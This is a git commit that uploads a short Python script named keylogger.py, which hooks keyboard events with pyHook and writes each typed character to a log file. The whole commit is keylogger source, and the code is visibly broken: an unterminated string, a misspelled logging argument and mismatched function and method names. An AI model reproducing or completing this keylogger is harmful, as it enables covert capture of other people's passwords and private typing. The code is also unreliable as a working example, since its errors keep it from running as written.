ab48c84ac4a8d22c5df8172d34477f076ad5e4ad
The-Noobest <49360390+The-Noobest@users.noreply.github.com>
2019-04-08 15:19:31 +0800

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,16 @@
+import pyHook, pythoncom, sys, logging
+
+file_log = 'mnt\\sdcard\\log.txt
+
+def OnKeyboardEvent(event):
+    logging.basicConfig(flename=file_log, level=logging.DEBUG, format='%(message)s')
+    chr(event.Ascii)
+    logging.log(10,chr(event.Ascii))
+    return True
+
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyBoardEvent
+hooks_manager.HookKeyBoard()
+pythoncom.PumpMessages()
+    
+        
